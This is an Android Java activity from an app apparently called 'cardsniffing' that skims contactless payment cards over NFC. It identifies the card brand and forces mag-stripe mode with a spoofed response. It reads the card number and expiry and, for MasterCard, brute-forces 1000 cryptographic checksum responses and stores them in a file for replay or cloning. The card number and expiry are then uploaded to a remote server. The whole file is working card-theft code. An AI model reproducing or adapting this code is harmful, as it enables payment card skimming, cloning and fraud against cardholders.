package com.ariel.cardsniffing;

import android.app.PendingIntent;
import android.content.Intent;
import android.nfc.NfcAdapter;
import android.nfc.Tag;
import android.nfc.tech.IsoDep;
import android.nfc.tech.NfcA;
import android.os.AsyncTask;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.RelativeLayout;
import android.widget.TextView;
import android.widget.Toast;

import com.ariel.cardsniffing.history.History;
import com.ariel.cardsniffing.model.Card;
import com.ariel.cardsniffing.model.Response;
import com.ariel.cardsniffing.network.RetrofitRequests;
import com.ariel.cardsniffing.network.ServerResponse;

import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.util.Arrays;

import rx.android.schedulers.AndroidSchedulers;
import rx.schedulers.Schedulers;
import rx.subscriptions.CompositeSubscription;

/*! Main Activity class with inner Card reading class*/

public class MainActivity extends AppCompatActivity {

    private NfcAdapter nfcAdapter;                                                              /*!< represents the local NFC adapter */
    private Tag tag;                                                                            /*!< represents an NFC tag that has been discovered */
    private IsoDep tagcomm;                                                                     /*!< provides access to ISO-DEP (ISO 14443-4) properties and I/O operations on a Tag */
    private String[][] nfctechfilter = new String[][]{new String[]{NfcA.class.getName()}};      /*!<  NFC tech lists */
    private PendingIntent nfcintent;                                                            /*!< reference to a token maintained by the system describing the original data used to retrieve it */
    private TextView cardType;                                                                  /*!< TextView representing type of card */
    private TextView progress;                                                                  /*!< TextView representing percentage of read data */
    private TextView cardNumber;                                                                /*!< TextView representing card number */
    private TextView cardExpiration;                                                            /*!< TextView representing card expiration */
    private CompositeSubscription mSubscriptions;
    private ServerResponse mServerResponse;
    private RelativeLayout info;
    private RelativeLayout card;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        /*!
            This method is where activity is initialized
         */
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        mSubscriptions = new CompositeSubscription();
        mServerResponse = new ServerResponse(findViewById(R.id.RL));
        nfcAdapter = NfcAdapter.getDefaultAdapter(this);
        nfcintent = PendingIntent.getActivity(this, 0, new Intent(this, getClass()).addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP), 0);
        initViews();
    }

    private void initViews() {
//        intro = (TextView) findViewById(R.id.intro);
        Toolbar toolbar = findViewById(R.id.tool_bar);
        setSupportActionBar(toolbar);
        info = findViewById(R.id.RL);
        card = findViewById(R.id.RL2);
        progress = (TextView) findViewById(R.id.progress);
        cardType = (TextView) findViewById(R.id.cardType);
        cardNumber = (TextView) findViewById(R.id.cardNumber);
        cardExpiration = (TextView) findViewById(R.id.cardExpiration);
    }


    @Override
    public void onResume() {
        /*!
            This method is called when user returns to the activity
         */
        super.onResume();
        //nfcAdapter.enableReaderMode(this, NfcAdapter.FLAG_READER_NFC_A | NfcAdapter.FLAG_READER_SKIP_NDEF_CHECK,null);
        nfcAdapter.enableForegroundDispatch(this, nfcintent, null, nfctechfilter);
    }

    @Override
    public void onPause() {
        /*!
            This method disable reader mode (enable emulation) when user leave the activity
         */
        super.onPause();
        nfcAdapter.disableReaderMode(this);
        //nfcAdapter.disableForegroundDispatch(this);
    }

    protected void onNewIntent(Intent intent) {
        /*!
            This is called when NFC tag is detected
         */
        super.onNewIntent(intent);
        tag = intent.getParcelableExtra(NfcAdapter.EXTRA_TAG);
        new CardReader().execute(tag);
    }


    @Override
    public boolean onCreateOptionsMenu(Menu menu) {

        getMenuInflater().inflate(R.menu.menu_base, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        int id = item.getItemId();
        if (id == R.id.action_history) {
            showHistory();
            return true;
        }
        return super.onOptionsItemSelected(item);
    }

    private void showHistory() {
        Intent intent = new Intent(this,History.class);
        startActivity(intent);
    }

    /*!
        Inner class that allows to preform card reading in background
        and publish results on the UI thread without having to manipulate threads and handlers
    */
    private class CardReader extends AsyncTask<Tag, String, String> {
        String cardtype = "Unknown";            /*!< string with card type */
        String cardnumber = "Unknown";          /*!< string with card number */
        String cardexpiration = "Unknown";      /*!< string with card expiration*/
        String error;               /*!< string with error value */

        @Override
        protected String doInBackground(Tag... params) {
            /*!
                This method performs background computation (Reading card data) that can take a long time ( up to 60-90 sec)
             */
            Tag tag = params[0];
            tagcomm = IsoDep.get(tag);
            try {
                tagcomm.connect();
            } catch (IOException e) {
                error = "Reading card data ... Error tagcomm: " + e.getMessage();
                return null;
            }
            try {
                readCard();
                tagcomm.close();
            } catch (IOException e) {
                error = "Reading card data ... Error tranceive: " + e.getMessage();
                return null;
            }
            return null;
        }

        private void readCard() {
            /*!
                This method reads all data from card to perform successful Mag-Stripe
                transaction and saves them to file.
             */
            try {
                String temp;
                FileOutputStream fOut = openFileOutput("EMV.card", MODE_PRIVATE);
                OutputStreamWriter myOutWriter = new OutputStreamWriter(fOut);
                byte[] recv = transceive("00 A4 04 00 0E 32 50 41 59 2E 53 59 53 2E 44 44 46 30 31 00");
                myOutWriter.append(Byte2Hex(recv) + "\n");
                temp = "00 A4 04 00 07";
                temp += Byte2Hex(recv).substring(80, 102);
                temp += "00";
                if (temp.matches("00 A4 04 00 07 A0 00 00 00 04 10 10 00"))
                    cardtype = "MasterCard";
                if (temp.matches("00 A4 04 00 07 A0 00 00 00 03 20 10 00"))
                    cardtype = "Visa Electron";
                if (temp.matches("00 A4 04 00 07 A0 00 00 00 03 10 10 00"))
                    cardtype = "Visa";

                if (temp.matches("00 A4 04 00 07 A0 00 00 00 25 01 04 00"))
                    cardtype = "American Express";


                recv = transceive(temp);
                myOutWriter.append(Byte2Hex(recv) + "\n");
                myOutWriter.append(toMagStripeMode() + "\n");
                recv = transceive("00 B2 01 0C 00");
                myOutWriter.append(Byte2Hex(recv) + "\n");

                if (cardtype == "MasterCard") {
                    cardnumber = new String(Arrays.copyOfRange(recv, 28, 44));
                    cardexpiration = new String(Arrays.copyOfRange(recv, 50, 52)) + "/" + new String(Arrays.copyOfRange(recv, 48, 50));

                    for (int i = 0; i < 1000; i++) {
                        recv = transceive("80 A8 00 00 02 83 00 00");
                        temp = "802A8E800400000";
                        temp += String.format("%03d", i);
                        temp += "00";
                        temp = temp.replaceAll("..(?!$)", "$0 ");
                        recv = transceive(temp);
                        myOutWriter.append(Byte2Hex(recv) + "\n");
                        if (i % 10 == 0) {
                            publishProgress(String.valueOf(i / 10));
                        }
                    }
                } else if (cardtype == "Visa" || cardtype == "Visa Electron") {
                    cardnumber = Byte2Hex(recv).substring(12, 36).replaceAll(" ", "");
                    cardexpiration = Byte2Hex(recv).substring(40, 43).replaceAll(" ", "") + "/" + Byte2Hex(recv).substring(37, 40).replaceAll(" ", "");
                } else if (cardtype == "American Express") {
                    cardnumber = "Unknown";
                    cardexpiration = new String(Arrays.copyOfRange(recv, 7, 9)) + "/" + new String(Arrays.copyOfRange(recv, 5, 7));

//                    String card ="";
//                    for(int i=0; i<recv.length;i++){
//                        card += " "+recv[i];
//                    }
//                    String finHex = Byte2Hex(recv);
//                    String finString = new String(Arrays.copyOfRange(recv, 0, recv.length-1));
                }

                myOutWriter.close();
                fOut.close();

            } catch (IOException e) {
                error = "Reading card data ... Error readCard: " + e.getMessage();
            }
        }


        protected byte[] transceive(String hexstr) throws IOException {
            /*!
                This method transceives all the data.
             */
            String[] hexbytes = hexstr.split("\\s");
            byte[] bytes = new byte[hexbytes.length];
            for (int i = 0; i < hexbytes.length; i++) {
                bytes[i] = (byte) Integer.parseInt(hexbytes[i], 16);
            }
            byte[] recv = tagcomm.transceive(bytes);
            return recv;
        }


        protected String Byte2Hex(byte[] input) {
        /*!
            This method converts bytes to strings of hex
         */
            StringBuilder result = new StringBuilder();
            for (Byte inputbyte : input) {
                result.append(String.format("%02X" + " ", inputbyte));
            }
            return result.toString();
        }

        protected String toMagStripeMode() {
            /*
                This method just returns card response with only Mag-Stripe mode support
             */
            return "770A820200009404080101009000";
        }

        protected void onProgressUpdate(String... percentage) {
            /*!
                Updates UI thread with progress
             */
            progress.setText("Reading card data ... " + percentage[0] + "%");
        }

        protected void onPreExecute() {
            /*!
                This method update UI thread before the card reading task is executed.
             */
            info.setVisibility(View.GONE);
            card.setVisibility(View.VISIBLE);

        }

        protected void onPostExecute(String result) {
            /*!
                This method update/display results of background card reading when the reading finishes.
             */
            progress.setText("Reading card data ... completed");
            if (error != null) {
                progress.setText(error);
                mServerResponse.downSnackBarMessage("Unable to read card.");
                return;
            }
            mServerResponse.downSnackBarMessage("Card data Extracted.");
            cardType.setText(cardtype);
            cardNumber.setText(cardnumber);
            cardExpiration.setText(cardexpiration);
            tryAddCard();

        }

        private void tryAddCard() {

            Card card = new Card();
            card.setCardtype(cardtype);
            card.setCardnumber(cardnumber);
            card.setCardexpiration(cardexpiration);

            newCardProcess(card);

        }

        private void newCardProcess(Card card) {
            mSubscriptions.add(RetrofitRequests.getRetrofit().newCard(card)
                    .observeOn(AndroidSchedulers.mainThread())
                    .subscribeOn(Schedulers.io())
                    .subscribe(this::handleResponse, i -> mServerResponse.handleErrorDown(i)));
        }

        private void handleResponse(Response response) {
        }
    }

}
